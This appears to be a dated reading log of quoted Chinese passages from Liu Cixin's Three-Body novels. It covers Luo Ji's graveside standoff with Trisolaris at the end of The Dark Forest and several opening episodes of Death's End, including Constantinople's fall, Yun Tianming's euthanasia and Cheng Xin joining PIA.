<p>雨仍在下着，现在已经不可能再有车了，好在这里离目的地已经不远，罗辑背起背包向前走去。走了约半小时后，他拐下公路，走上了一条小路。远离了路灯，四周变得很黑，他从背包中取出手电照着脚下的路。路越来越难走，湿透的鞋子踏在地上咕咕作响，他在泥泞中滑倒了好几次，身上沾满了泥，只好把背包中的铁锹取出来当拐杖，前方只能看到一片雨雾，但他知道自己的大方向是没有错的。</p>
<p>在雨夜中步行了一个小时后，罗辑来到了那片墓地。墓地的一半已经被埋在沙下，另一半由于地势较高，仍露在外面。他打着手电在一排排墓碑间寻找，略过了那些豪华的大碑，只看那些简朴的小墓碑上的碑文。雨水在石碑上反着光，像闪动的眸子一般，罗辑看到，这些墓都是20世纪末和21世纪初危机出现前建的，这些已经在时光中远去的人们很幸运，他们在最后的时刻，肯定认为自己生存过的这个世界将永恒地存在下去。</p>
<p>2016-01-19</p>
<p>罗辑对找到自己想找的墓碑并没抱太大希望，但他竟很快找到了。他没看碑文就认出了它，时间已过去了两个世纪，这真是件很奇怪的事。也许是雨水冲刷的缘故，墓碑并没有显出时间的痕迹，上面“杨冬之墓”四个字像是昨天才刻上去的。叶文洁的墓就在她女儿的墓旁边，两个墓碑除碑文外一模一样，叶文洁的墓碑上也是只有姓名和生卒年月，这让罗辑想起了红岸遗址的那块小石碑，它们都是为了忘却的纪念。两块墓碑静静地立在夜雨中，仿佛一直在等待着罗辑的到来。</p>
<p>2016-01-19</p>
<p>罗辑感到很累，就在叶文洁的墓旁坐了下来，但他很快在夜雨的寒冷中颤抖起来，于是他拄着铁锹站了起来，在叶文洁母女的墓旁开始挖自己的墓穴。</p>
<p>开始时，湿土挖起来比较省力，但再往下，土就变得坚硬了，还夹杂着很多石块，罗辑感觉自己挖到了山体本身。这让他同时感到了时间的无力和时间的力量：也许在这两个世纪中就沉积了上面这薄薄的一层沙土；而在那漫长的没有人的地质年代里，却生成了承载墓地的这座山。他挖得很吃力，只能干一会儿休息一会儿，夜就在不知不觉中流逝着。</p>
<p>2016-01-19</p>
<p>后半夜雨停了，后来云层也开始散开，露出了一部分星空。这是罗辑来到这个时代以后看到过的最明亮的星星，二百一十年前的那个黄昏，就在这里，他和叶文洁一起面对着同一片星空。</p>
<p>2016-01-19</p>
<p>现在他只看到星星和墓碑，但这却是最能象征永恒的两样东西。</p>
<p>罗辑终于耗尽体力，再也挖不下去了。看看已经挖出的坑，作为墓穴显然浅了些，但也只能这样了。其实他这样做，无非是提醒人们自己希望被葬在这里，但他最可能的归宿是在火化炉中变成灰烬，然后骨灰被丢弃在一个不为人知的地方，不过这真的都无所谓了，很可能，就在这之后不久，他的骨灰会同这个世界一起在一场更为宏大的火化中变成离散的原子。</p>
<p>2016-01-19</p>
<p>罗辑靠在叶文洁的墓碑上，竟然很快睡着了。也许是寒冷的缘故，他又梦到了雪原，在雪原上他再次看到了抱着孩子的庄颜，她的红围巾像一束火苗。她和孩子都在向他发出无声的呼唤，而他则向她们拼命喊叫，让她们离远些，因为水滴就要撞击这里了！但他的声带发不出声音，似乎这个世界已经被静音了，一切都处于绝对的死寂中。但庄颜似乎明白了他的意思，抱着孩子在雪原上远去了，在雪地上留下的一串脚印，像国画中一道淡淡的墨迹，雪原只是一片空白，只有这道墨迹才能显示大地甚至世界的存在，于是，一切又变成庄颜的那幅画了。罗辑突然悟出，她们走得再远也无法逃脱，因为即将到来的毁灭将囊括一切，而这毁灭与水滴无关……他的心再次在剧痛中撕裂，他的手在空中徒劳地抓着，但在雪原形成的一片空白中只有庄颜渐远的身影，已变成一个小黑点。他向四周看看，想在空白世界中找到一些实在的东西，真的找到了，是在雪地上并排而立的两块黑色墓碑。开始它们在雪中很醒目，但碑的表面在发生变化，很快变成了全反射的镜面，像水滴表面那样，上面的碑文都消失了。罗辑伏到一块碑前想通过镜面看看自己，但自己在镜中没有映像，镜子所映出的雪原上也没有了庄颜的身影，只有雪地上那一行淡淡的脚印。他猛回头，看到镜像外的雪原只是一片空白，连脚印都消失了，于是他又回头看墓碑的镜面，它们映射着空白的世界，几乎把自身隐形了，但他的手还是能感觉到它们那冰冷光滑的表面……</p>
<p>2016-01-19</p>
<p>罗辑醒来时天已经蒙蒙亮，在初露的晨曦中，墓场清晰起来，从躺着的角度看周围的墓碑，罗辑感到自己仿佛置身于上古的巨石阵中。他在发着高烧，牙齿在身体的剧烈颤抖中格格作响，他的身体像一根油尽的灯芯，在自己燃烧自己了。他知道，现在是时候了。</p>
<p>2016-01-19</p>
<p>在这个季节的这个时间，蚂蚁应该很少出现了，但那确实是一只蚂蚁，它在碑上攀爬着，同两个世纪前的那个同类一样，被碑文吸引了，专心致志地探索着那纵横交错的神秘沟槽。看着它，罗辑的心最后一次在痛苦中痉挛，这一次，是为地球上所有的生命。</p>
<p>2016-01-19</p>
<p>如果我做错了什么，对不起。”他对蚂蚁说。</p>
<p>2016-01-19</p>
<p>罗辑艰难地站了起来，在虚弱的颤抖中，他只有扶着墓碑才能站住。他腾出一只手来，整理了一下自己满是泥浆的湿衣服和蓬乱的头发，随后摸索着，从上衣口袋中掏出一个金属管状物，那是一支已经充满电的手枪。</p>
<p>然后，他面对着东方的晨光，开始了地球文明和三体文明的最后对决。</p>
<p>“我对三体世界说话。”罗辑说，声音并不高，他本想重复一遍，但是没有，他知道对方能听到。</p>
<p>一切没有变化，墓碑静静地立在凌晨的宁静中，地上的水洼映着正在亮起来的天空，像一片片镜子，这给人一个错觉：似乎地球就是一个镜面球体，大地和世界只是附着于其上的薄薄一层，现在由于雨水的冲刷，球体光滑的表面一小片一小片露出来了。这个仍未醒来的世界，不知道自己已被当做一场豪赌的筹码，放到了宇宙的赌桌上。</p>
<p>罗辑抬起左手，露出了戴在手腕上的手表大小的东西说：“这是一个生命体征监测仪，它通过一个发射器与一套摇篮系统联结。你们一定记得两个世纪前面壁者雷迪亚兹的事，那就一定知道摇篮系统是什么。这个监测仪所发出的信号通过摇篮系统的链路，到达雪地工程部署在太阳轨道上的三千六百一十四枚核弹，信号每秒钟发射一次，维持着这些核弹的非触发状态。如果我死去，摇篮系统的维持信号将消失，所有的核弹将被引爆，包裹核弹的油膜物质将在爆炸中形成围绕太阳的三千六百一十四团星际尘埃，从远方观察，在这些尘埃云团的遮挡下，太阳将在可见光和其他高频波段发生闪烁。太阳轨道上所有核弹的位置都是经过精心布置的，这将使得太阳闪烁形成的信号发送出三张简单的图形，就像我两个世纪前发出的那三张图一样，每张上面有三十个点的排列，并标注其中一个点，它们可以组合成一张三维坐标图。但与那次不同的是，这次发送的，是三体世界与周围三十颗恒星的相对位置。太阳将变成银河系中的一座灯塔，把这咒语发送出去，当然，太阳系和地球的位置也会同时暴露。从银河系中的一点看，图形发射完成需要一年多的时间，但应该有很多技术发展到这样程度的文明，可以从多个方向同时观测太阳，那样的话，只需几天甚至几个小时，他们就能得到全部信息。”</p>
<p>2016-01-19</p>
<p>随着天光渐明，星星在一颗颗消失，仿佛无数只眼睛渐次闭上；而东方正在亮起的晨空，则像一只巨大的眼睛在慢慢睁开。蚂蚁继续在叶文洁的墓碑上攀爬着，穿行在她的名字构成的迷宫中。早在这个靠碑而立的豪赌者出现前的一亿年，它的种族已经生活在地球上，这个世界有它的一份，但对正在发生的事，它并不在意。</p>
<p>2016-01-19</p>
<p>罗辑离开墓碑，站到他为自己挖掘的墓穴旁，将手枪顶到自己的心脏位置，说：“现在，我将让自己的心脏停止跳动，与此同时我也将成为两个世界有史以来最大的罪犯。对于所犯下的罪行，我对两个文明表示深深的歉意，但不会忏悔，因为这是唯一的选择。我知道智子就在身边，但你们对人类的呼唤从不理睬，无言是最大的轻蔑，我们忍受这种轻蔑已经两个世纪了，现在，如果你们愿意，可以继续保持沉默，我只给你们三十秒钟时间。”</p>
<p>罗辑按照自己的心跳来计时，由于现在心跳很急促，他把两次算一秒钟，在极度的紧张中他一开始就数错了，只好从头数起，所以当智子出现时他并不能确定到底过了多少时间，客观时间大约流逝了不到十秒钟，主观时间长得像一生。这时他看到世界在眼前分成了四份，一份是周围的现实世界，另外三份是变形的映像。映像来自他前上方突然出现的三个球体，它们都有着全反射的镜面，就像他在最后一个梦中见到的墓碑那样。他不知道这是智子的几维展开，那三个球体都很大，在他的前方遮住了半个天空，挡住了正在亮起来的东方天际，在球体映出的西方天空中他看到了几颗残星，球体下方映着变形的墓地和自己。罗辑最想知道的是为什么是三个，他首先想到的是三体世界的象征，就像叶文洁在最后一次ETO的聚会上看到的那个艺术品；但看到球体上所映照的虽然变形但异常清晰的现实图像时，他又感觉那是三个平行世界的入口，暗示着三种可能的选择；接下来看到的又否定了他的这种想法，因为三个球体上都出现了两个相同的字：</p>
<p>住　手！</p>
<p>“我可以谈谈条件吗？”罗辑仰头看着三个球体问。</p>
<p>你先把枪放下，然后我们可以谈判。</p>
<p>这些字仍是在三个球体上同时显示的，字迹发出红色的光芒，极其醒目，罗辑看到字行在球体上没有变形，是整齐的一行，以至于看上去既像在球体表面，又像在它们的内部，他提醒自己，这是在看高维空间在三维世界中的投影。</p>
<p>2016-01-19</p>
<p>这不是谈判，是我继续活下去的要求，我只希望知道你们答应还是不答应。”</p>
<p>说出你的要求。</p>
<p>“让水滴，或者说探测器，停止向太阳发射电波。”</p>
<p>已经按你说的做了。</p>
<p>球体的回答快得出乎预料，罗辑现在并没有什么办法去核实，但他感到周围的空间有了一些微妙的变化，就像某种因持续存在而不为人察觉的背景音消失了，当然，这也许是幻觉，人是感觉不到电磁辐射的。</p>
<p>“让正在向太阳系行进的九个水滴立刻改航向，飞离太阳系。”</p>
<p>这一次三个球体的回答稍微延迟了几秒钟。</p>
<p>已经按你说的做了。</p>
<p>“请给人类核实的手段。”</p>
<p>九个探测器都将发出可见光，你们的林格-斐兹罗望远镜就能观测到它们。</p>
<p>罗辑仍然不可能核实这些，但这个时候，他相信三体世界。</p>
<p>“最后一个条件：三体舰队不得越过奥尔特星云。”舰队现在已处于最大的减速推进功率，不可能在奥尔特星云外侧把与太阳的相对速度减到零。</p>
<p>“那就像水滴编队一样转向，使航线偏离太阳系。”</p>
<p>向哪个方向转向都是死路，这样会使舰队掠过太阳系进入荒凉太空，到时无论是返回三体世界还是寻找其他可生存星系，都要相当长的时间，舰队生态循环系统维持不了那么长时间。</p>
<p>“也不一定是死路，也许以后人类或三体世界的飞船能够追上并营救他们。”</p>
<p>这需要最高执政官的指令。</p>
<p>“转向毕竟是一个很长的过程，先做起来吧，给我和别的生命一个活下去的机会。”</p>
<p>一段长达三分钟的沉默，然后：</p>
<p>舰队将在地球计时十分钟后开始转向，大约转向开始三十分钟后，人类太空观测系统就能觉察到航向的改变。</p>
<p>“好，对我来说已足够。”罗辑说，同时把手枪从胸口移开，他的另一只手扶着墓碑，尽力不让自己倒下，“你们早就知道宇宙的黑暗森林状态吗？”</p>
<p>2016-01-19</p>
<p>是的，早就知道，你们这么晚才知道倒是一件很奇怪的事……你的健康状况让我们担忧，这不会意外中断摇篮系统的维持信号吧？“不会，这套装置比雷迪亚兹的要先进许多，我只要活着信号就不会中断发射。”</p>
<p>你最好还是坐下来，这样会对你的状况有所改善。</p>
<p>“谢谢。”罗辑说，靠着墓碑坐了下来，“不要担心，我死不了的。”</p>
<p>我们正在和两个国际的最高层取得联系，要不要为你叫一辆救护车？</p>
<p>罗辑笑着摇摇头，“不用，我不是救世主，只想像一个普通人那样离开这里回家，我休息一会儿就走。”</p>
<p>三个球体中的两个消失了，剩下的一个显示的字迹也不再发光，显得黯淡阴郁：</p>
<p>我们还是失败在计谋上。</p>
<p>2016-01-19</p>
<p>罗辑点点头，“用尘埃云遮挡太阳向星际发送信息并不是我的发明，早在20世纪就有天文学家提出过这个设想。其实你们有过多次识破我的机会。比如在雪地工程的全过程中，我一直对核弹在太阳轨道上的精确位置那么在意。”</p>
<p>你还在长达两个月的时间里，一个人待在控制室中，遥控核弹上的离子发动机对它们的位置进行微调，我们当时对这些都没有在意，以为你只是通过无意义的工作来逃避现实。我们从来就没有想到这些核弹的间距有什么意义。</p>
<p>2016-01-19</p>
<p>“还有一个机会，那时我向一个物理学家小组咨询智子在太空中展开的问题。如果ETO还在，他们早就识破我了。”</p>
<p>是的，抛弃他们是一个错误。</p>
<p>2016-01-20</p>
<p>还有，我要求在雪地工程中建立这样奇怪的摇篮触发系统。”</p>
<p>这确实使我们想起了雷迪亚兹，但没有由此想更多，两个世纪前的雷迪亚兹对我们是无害的，另外两个面壁者对我们也是无害的，我们把对他们的轻视也转移到你身上。</p>
<p>“对他们的轻视是不公平的，那三位面壁者都是伟大的战略家，他们看清了人类在末日之战中必然失败的事实。”也许我们可以开始谈判了。</p>
<p>“那不是我的事情了。”罗辑说完长长地出了一口气，感到了如新生一般的轻松和惬意。</p>
<p>是的，你已经完成了面壁者的使命，但总能提一些建议吧？</p>
<p>“人类的谈判者肯定首先提出，要你们帮助建立一个更完善的信号发射系统，使人类掌握随时向太空发射咒语的能力。即使水滴解除对太阳的封锁，现在的系统也实在太原始了。”</p>
<p>我们可以帮助建立一个中微子发射系统。</p>
<p>“据我所了解的情况，他们可能更倾向于引力波。在智子降临后，这是人类物理学向前走得比较远的领域，他们当然需要一个自己能够了解其原理的系统。”</p>
<p>引力波的天线体积很巨大的。</p>
<p>“那是你们和他们的事。奇怪，我现在感觉自己不是人类的一员了，我的最大愿望就是尽快摆脱这一切。”</p>
<p>接下来他们会要求我们解除智子封锁，并全面传授科学技术。</p>
<p>“这对你们也很重要，三体世界的技术是匀速发展的，直到两个世纪后仍未派出速度更快的后续舰队，所以，要救援偏航的三体舰队，只能靠未来的人类了。”</p>
<p>我要离开了，你真的能够自己回去吗？你的生命关系到两个文明的生存。</p>
<p>“没问题，我现在感觉好多了，回去后我就立刻把摇篮系统移交出去，然后，我就与这一切无关了，最后只想说：谢谢。”</p>
<p>为什么？</p>
<p>“因为你们让我活下来了，其实，只要换个思考方式，我们都能活下来。”</p>
<p>球体消失了，回到了十一维度的微观状态。太阳已经从东方露出一角，把金辉洒向这个从毁灭中幸存的世界。</p>
<p>罗辑慢慢站起身，最后看了一眼叶文洁和杨冬的墓碑，沿着来时的小路蹒跚走去。</p>
<p>那只蚂蚁已经爬到了墓碑顶端，骄傲地对着初升的太阳挥舞两只触须，对于刚才发生的事，仅就地球生命而言，它是唯一的目击者。</p>
<p>2016-01-20</p>
<p>通过忠实地映射宇宙来隐藏自我，是融入永恒的唯一途径。</p>
<p>2016-01-20</p>
<p>“我有一个梦，也许有一天，灿烂的阳光能照进黑暗森林。”</p>
<p>这时，这里的太阳却在落下去，现在只在远山露出顶端的一点，像山顶上镶嵌着的一块光灿灿的宝石。孩子已经跑远，同草地一起沐浴在金色的晚霞之中。</p>
<p>2016-01-20</p>
<p>太阳快落下去了，你们的孩子居然不害怕？</p>
<p>“当然不害怕，她知道明天太阳还会升起来的。”</p>
<hr>


<h3 id="三体-3：死神永生"><a href="#三体-3：死神永生" class="headerlink" title="三体 3：死神永生"></a>三体 3：死神永生</h3><p>刘慈欣</p>
<p>公元1453年5月，魔法师之死</p>
<p>2016-01-20</p>
<p>她的面庞有一种淫荡的妩媚，让人想起宁可美艳地腐烂也不悄然枯萎的花朵——一个妓女，混得还不算坏的那种。她双目低垂，浑身颤抖，但君士坦丁注意到，她的眼睛像得了热病似的发着光，透出一种她那个阶层的人很少见的兴奋与期待。</p>
<p>2016-01-20</p>
<p>狄奥伦娜从羊皮袋中摸出一把土耳其弯刀，像一轮在黑暗中发着冷光的残月</p>
<p>2016-01-20</p>
<p>然后她用斗篷前领半遮住脸，转身沿阶梯向上走去，步伐悄无声息。在两排火把形成的光晕和黑暗中，她仿佛在交替变换外形，时而像人，时而像猫，直到渐渐消失在黑暗中。</p>
<p>2016-01-20</p>
<p>那个女巫的事他几乎已忘到脑后，与父亲曼努埃尔二世和哥哥约翰八世不同，他更现实一些，知道把一切托付给奇迹的人最终大多死无葬身之地。</p>
<p>2016-01-20</p>
<p>狄奥伦娜看着这一切，陶醉地闭上了双眼：这是我的战场了，这是我的战争了。小时候父亲无数次讲述的祖先的传奇又在她脑海中浮现：在欧洲普罗旺斯的一处农庄，有一天天降祥云，云中开来一支孩子的军队，在他们威武的盔甲上，十字发出红光，一个天使率领着他们，在他们的召唤下，先祖加入了。他们渡过地中海来到圣地，为上帝而战，先祖在圣战中成长为圣殿骑士，后来在君士坦丁堡遇到一位美丽的圣女骑士，他们坠入爱河，由此诞生了这个伟大的家族……</p>
<p>长大后，狄奥伦娜渐渐知道了些真相：故事的大框架倒基本没错，她的先祖确实加入了童子军，那时西欧黑死病刚过，田园一片荒芜，加入童子军只是为了混一口饭吃不至于饿死。不过，先祖从未参加过任何圣战，因为一下船他便和其他一万多个孩子都被钉上脚镣卖身为奴，多年后才侥幸逃脱，流浪到君士坦丁堡。在那里他也确实遇到了圣女骑士团中的一个比他大许多的女兵，只不过她的命运一点儿都不比他强。那一次，拜占庭人眼巴巴地盼着西欧的精兵来对付异教徒，不想来的却是一批像叫花子似的手无缚鸡之力的女孩子，他们一气之下中断了所有供给，结果圣女们纷纷沦为娼妓，其中的一位后来成了狄奥伦娜的祖奶奶……</p>
<p>2016-01-20</p>
<p>一百多年来，狄奥伦娜这个光荣的家族其实从来食不果腹，到父亲这一代更是一贫如洗。饥饿使狄奥伦娜自作主张干起了祖奶奶那一行，父亲知道后痛揍了她一顿，说再发现她干这个就杀了她，除非……除非她把客人领到家里来，由他与对方议价、收钱。狄奥伦娜从此离开家，继续自己的风尘生涯，除了君士坦丁堡，她还到过耶路撒冷和特拉布宗，甚至还乘船到过威尼斯。她不再挨饿，也有好衣服穿，但她知道自己是一株倒在淤泥中的小草，在路人不断的践踏下，早已与淤泥混为一体了。</p>
<p>2016-01-20</p>
<p>外面有不安的喧哗声，侍卫报告发生了月食。这是再明白不过的凶兆，因为在千年的风雨中有这样一句格言：只要明月照耀，君士坦丁堡就不会陷落。透过长窗，皇帝看着那变成一个黑洞的月亮，那是天上的坟墓。他已预感到，狄奥伦娜不会回来，他也得不到那颗人头了。</p>
<p>2016-01-21</p>
<p>在一天的惨烈血战接近尾声时，君士坦丁十一世面对着蜂拥而来的奥斯曼军队，高喊一声：“难道就没有一个基督徒来砍下我的头吗？！”然后皇帝掀下紫袍，拔剑冲入敌阵，他那银色的盔甲像扔进暗红色镪水的一小片锡箔，转瞬间无影无踪……</p>
<p>2016-01-21</p>
<p>君士坦丁堡陷落的历史意义许久之后才显现出来，事情发生时人们首先想到的，就是罗马帝国终于完全消失了。拜占庭是古罗马拖在身后的长达千年的车辙，虽也有过辉煌，但还是终于像烈日下的水渍一样蒸发了。当年，古罗马人在宏伟华丽的浴宫中吹着口哨，认为帝国就像身下的浴池一样，建在整块花岗岩上，将永世延续。</p>
<p>危机纪元元年，生命选项</p>
<p>2016-01-21</p>
<p>另一件事是关于母亲。杨冬有一次意外地发现，母亲电脑中收到的信息有极高的加密级别，这引起了她很强的好奇心。但解密后的信息没有放进文件粉碎机，只是删除。同所有上年纪的人一样，母亲对电脑和网络都不熟悉，不知道即使把硬盘格式化，上面的信息也可轻松恢复。杨冬做了有生以来第一件背着妈妈的事：把部分删除的信息恢复了。信息量很大，她读了好几天，知道了母亲和三体世界的秘密。</p>
<p>杨冬几乎被震惊所击倒，相依为命的妈妈原来是另一个人，而且是她之前甚至不敢相信这世界上可能存在的那种人。她不敢去问母亲，永远不敢，因为一问，母亲就真的永远变成另一个人了。让母亲保留自己的秘密，杨冬则假装妈妈仍是原来的妈妈，生活也能继续下去。当然，这生活对杨冬来说，也只剩半条命了。</p>
<p>2016-01-21</p>
<p>用半条命生活其实也没什么，据她观察，周围的人相当一部分都是生活在半条命之中，只要善于忘却和适应，半条命也可以活得很平静，甚至很幸福。</p>
<p>2016-01-21</p>
<p>这是最粗略的运算，精确模拟要花一个月时间。”绿眼镜说，同时移动鼠标，从太空向行星表面俯冲下去。视野掠过广阔的沙漠，飞过一群形状怪异的山峰，那些山像一根根巨大的柱子；接着，又飞过深不见底的大裂谷和一个像是陨石坑的圆盆地。</p>
<p>“这是哪儿？”杨冬迷惑地问。“地球啊。如果没有生命，地球演化到现在，表面就是这个样子。”“可是……海洋呢？”</p>
<p>“没有海洋，没有河流，全是干的。”“你是说，如果没有生命，地球上连液态水都没有了？”</p>
<p>“真实情况可能比这还惊人。这当然只是粗略的模拟，但至少让你看到了生命对地球现在形态的影响有多大。”“可……”</p>
<p>“你是不是以为，生命只是地球表面一层薄薄的、软软的、稀稀拉拉的、脆弱的东西？”“不是吗？”“那你忽略了时间的力量。一队蚂蚁不停搬运米粒大小的石块，给它们十亿年，就能把泰山搬走。只要把时间拉得足够长，生命比岩石和金属都强壮得多，比飓风和火山更有力。”</p>
<p>“可造山运动主要还是地质力量在起作用吧。”“不一定。生命也许不能造山，但能改变山脉的分布，比如有三座大山，植物在其中两座上生长，没有植物的那座山就会很快被风化夷平，这里说的很快是一千万年左右，在地质上真的不长。”</p>
<p>“那海洋是怎么消失的？”“这得看模拟过程的记录，太麻烦，不过可以猜。植物、动物和细菌，都对形成现在这样的大气层产生过重要作用，如果没有生命，现在的大气成分会有很大不同，可能已经无法阻拦紫外线和太阳风，海洋会蒸发，地球大气先是变成金星那样的蒸笼，水汽从大气层顶部向太空蒸发，几十亿年下来，地球就成干的了。”</p>
<p>杨冬不再说话，默默地看着那个干涸的黄色世界。“所以，现在的地球，是生命为自己建的家园，与上帝没什么关系。”绿眼镜对着大屏幕做出拥抱的姿势，显然对自己刚才的口才发挥很满意。以杨冬现在的精神状态，她本来根本没有心思谈这些和看这些，但就在绿眼镜去掉数学模型中的生命选项时，她的思想突然有了震撼的一闪念，现在，她终于问出了那个可怕的问题：</p>
<p>“那宇宙呢？”“宇宙？宇宙怎么了？”正在关闭模拟进程的绿眼镜不解地问。</p>
<p>“如果有一个像这样的数学模型来模拟整个宇宙，像刚才那样，在开始运行时把生命选项去掉，那结果中的宇宙看起来是什么样子？”“当然还是现在这样子了，如果结果正确的话。我刚才说的生命对世界的改变仅限于地球，宇宙嘛，生命就是有也极稀少，对演化过程的影响可以忽略不计。”</p>
<p>杨冬想说什么但终于没说出来，于是再次同绿眼镜告别，并努力向他露出一个感激的微笑。她来到大楼外面，仰望初现的星空。</p>
<p>2016-01-21</p>
<p>从妈妈电脑上的那些信息中可知，宇宙中的生命并不稀少，宇宙是很拥挤的。</p>
<p>那么，宇宙现在已经被生命改变了多少，这种改变已到了什么层次和深度？后一个问题尤其令杨冬恐惧。</p>
<p>2016-01-21</p>
<p>大自然真是自然的吗？</p>
<p>危机纪元4年，云天明</p>
<p>2016-01-21</p>
<p>安乐室里只剩老李一人了。安乐程序正式开始，屏幕显示问题，同时由一个柔美的女声读出来：</p>
<p>你要结束自己的生命吗？是，请按3键；否，请按0键。老李按了3。你要结束自己的生命吗？是，请按5键；否，请按0键。</p>
<p>老李按了5。然后问题又显示了两次，肯定键分别是1和2，老李都按了。</p>
<p>你要结束自己的生命吗？这是最后一次提示。是，请按4键；否，请按0键。一瞬间，一股悲哀的巨浪冲上云天明的脑际，几乎令他昏厥，母亲去世时他都没有感觉到这种极度的悲怆。他想大喊让老李按0，想砸玻璃，想杀了那个声音柔美的女人。</p>
<p>但老李按了4。</p>
<p>2016-01-21</p>
<p>何博士摇头笑笑，“先生，看得出您对天文学并不外行。那您想想，对我们来说，286光年和286亿光年有多大区别？”</p>
<p>云天明默认了这句话。确实没多大区别。“但这颗星有一个最大的优点：能看见。其实我觉得，买恒星主要看外观，距离啊带不带行星啊什么的都不重要，能看见的远星要比不可见的近星好得多，能看见的裸星要比不可见的带行星的好得多，说到底，我们不是也只能看嘛。”</p>
<p>2016-01-21</p>
<p>云天明对博士点点头，程心能看到那颗星，那很好。</p>
<p>2016-01-21</p>
<p>云天明发现何博士似乎对自己的话并没感到吃惊，只是默默地点了一支烟，也许，他已经察觉到了什么。沉默许久后，他说：“真那样的话，你仍然是很幸运的，大多数人，到死都没向尘世之外瞥一眼。”</p>
<p>2016-01-21</p>
<p>云天明想，当程心看到这颗星时，自己已不在人世了。其实，他和程心看到的这颗星星，是它在二百八十六年前的样子，这束微弱的光线在太空中行走了近三个世纪才接触到他们的视网膜，而它现在发出的光线，要二百八十六年后才能到达地球，那时程心也不在人世了。</p>
<p>她将度过怎样的一生呢？但愿她能记得，茫茫星海中，有一颗星星是属于她的。</p>
<p>2016-01-21</p>
<p>这是云天明的最后一天了，他本想看出些特别之处，但没有。</p>
<p>2016-01-21</p>
<p>。在进行安乐的这一边，公证人离开后，只有他和护士了。护士很漂亮，已没有第一次做这事时的恐惧和紧张，把自动注射机的针头扎进云天明的左臂时，动作镇定沉稳。他突然对护士产生了一种莫名的感情，她毕竟是世上最后一个陪伴自己的人了。他突然想知道二十八年前给自己接生的是谁，这两个人是这个世界上少有的真正帮过自己的人，他应该感谢他们，于是他对护士说了声谢谢。护士对他微笑了一下，然后离开了，脚步像猫一般无声。</p>
<p>2016-01-21</p>
<p>他出生在一个知识分子家庭，但父母都属于社会和人际的低能者，混得很落魄。他们没有贵族的身份，却执意对云天明进行贵族教育，他看的书必须是古典名著，听的音乐必须是古典名曲，交往的人必须是他们认为有修养有层次的。他们一直告诉他周围的人和事是多么的庸俗，他们自己的精神品位要比普通人高出多么大的一截。小学时云天明还是有几个朋友的，但他从来不敢把他们带到家里玩，因为父母肯定不认可他与这样庸俗的孩子在一起。到了初中，随着贵族教育的进一步深化，云天明变得形单影只了。但正是在这个时候，父母离异了。导致家庭解体的是父亲的第三者，那是一个推销保险的女孩。母亲再嫁的是一位富有的建筑承包商。这两个人都是父母极力让孩子远离的人，所以这时他们也明白，自己再也没有资格对孩子进行那种教育了。但贵族教育已经在云天明的心底扎了根，他无法摆脱，就像以前的那种能上发条的手铐，越想挣脱，它铐得越紧。在整个中学时代，他变得越来越孤僻，越来越敏感，离人群也越来越远。</p>
<p>童年和少年的记忆，都是灰色的。</p>
<p>2016-01-21</p>
<p>那时他真希望夜风转个方向，那样她的长发就能拂到他的面庞上。</p>
<p>2016-01-21</p>
<p>这一刻很像他的一生，执著地守望着一个渺茫的希望。</p>
<p>2016-01-21</p>
<p>来了，爱了，给了她一颗星星，走了。</p>
<p>危机纪元1-4年，程心</p>
<p>2016-01-21</p>
<p>PIA总部设在距联合国大厦不远的一幢六层旧楼中，此楼建于18世纪末，结实厚重，像是一大块花岗岩。飞越大洋的程心第一次走进楼里，感到一阵城堡中的阴冷。这里与她想象中的地球世界的情报中心完全不同，更像一个在窃窃私语中产生拜占庭式阴谋的地方。</p>
<p>2016-01-21</p>
<p>走进局长宽大的办公室，一股浓烈的雪茄味扑面而来。首先吸引程心目光的是墙上那幅大油画，广阔画面的大部分都被布满铅云的天空和晦暗的雪野所占据，在远景的深处，几乎到了云与雪交会的地方，有一片黑糊糊的东西，细看是一片肮脏的建筑，大部分是低矮的板房，其间有几幢两三层的欧式楼房。从画面前方那条河流和其他的地形看，这可能是18世纪初的纽约。这画给程心最大的感觉就是冷，倒是很符合坐在画下那个人的形象。这幅画旁边还有一幅较小的油画，画面的主体是一把古典样式的剑，带着金色的护腕，剑锋雪亮，握在一只套着青铜盔甲的手中，这只手只画到小臂；这只握着剑的手正从蓝色的水面上捞起一个花冠，花冠由红、白、黄三色的鲜花编成。这幅画的色调与大画相反，华丽明艳，但隐藏着一种不祥的诡异，程心注意到，花冠的白花上有明显的血迹。</p>
<p>PIA局长托马斯·维德比程心想象的年轻许多，看上去比瓦季姆都年轻，也比后者长得帅，脸上的线条很古典。程心后来发现，这种古典的感觉多半来自他的面无表情，像从后面的油画中搬出来的一座冰冷的雕像。他看上去不忙，前面的大办公桌上空空荡荡，没有电脑和文件，他正专心致志地研究着手中雪茄的烟头，程心进来后，他只是抬头扫了一眼，然后又继续研究烟头。当程心介绍完自己并请他以后多多指教时，他才抬起头来，那目光给她最初的印象是疲倦和懒散，但在深处隐约透出一丝令她不安的锐利。他脸上出现了一抹笑意，但丝毫没有使程心感到温暖和放松，那微笑像冰封的河面上一条冰缝中渗出的冰水，在冰面上慢慢弥散开来。程心试着报以微笑，但维德的第一句话让她的微笑和整个人都凝固了：“你会把你妈卖给妓院吗？”维德问。</p>
<p>程心惊恐地摇摇头，不是表示她不会把她妈卖给妓院，而是怀疑自己是不是听错了。但维德挥挥夹雪茄的手说：“谢谢，忙你的事儿去吧。”</p>
<p>2016-01-21</p>
<p>呵呵，这是业内曾流传的一句……一句……就是一句话吧，可能起源于二战时期，老鸟常用它来调侃新手，它是说：地球上只有我们这个行业是以欺骗和背叛为核心的。对于有些公认的准则，我们应该适当地……怎么说呢……灵活一些。PIA由两部分人组成，一部分是你这样的专业人员，另一部分来自情报和军队的秘密战部门，这两种人的思想方法和行为方式很不一样——好在两者我都熟悉，我会帮助你们互相适应的。”</p>
<p>2016-01-21</p>
<p>“核弹不在飞船上。”程心从容地说，她这句话像一只手捂在锣面上，使周围的笑声戛然而止，“飞船只是由帆和探测器组成，轻得像一片羽毛，很容易被核爆炸的辐射加速。”会场陷入沉默，大家都在想核弹在哪里，但没有人问。刚才众人哄笑时，维德一直一脸冰霜地坐在那里，现在，那种冰水似的微笑却在他的脸上慢慢浮现。</p>
<p>2016-01-21</p>
<p>“我们可以把这种方式叫航线推进，这段航线叫推进航段，它只占整条航线中极小的一部分，以一千颗推进核弹估算，可以分布在从地球到木星的五个天文单位上，甚至更短，把推进航段压缩到火星轨道以内，以目前的技术，这是可以做到的。”</p>
<p>2016-01-21</p>
<p>没人说话，有人欲言又止，显然觉得自己的想法很难同程心的竞争。大家的目光又渐渐集中到她身上，只是眼神与上次不同了。</p>
<p>2016-01-21</p>
<p>阶梯计划</p>
<p>2016-01-21</p>
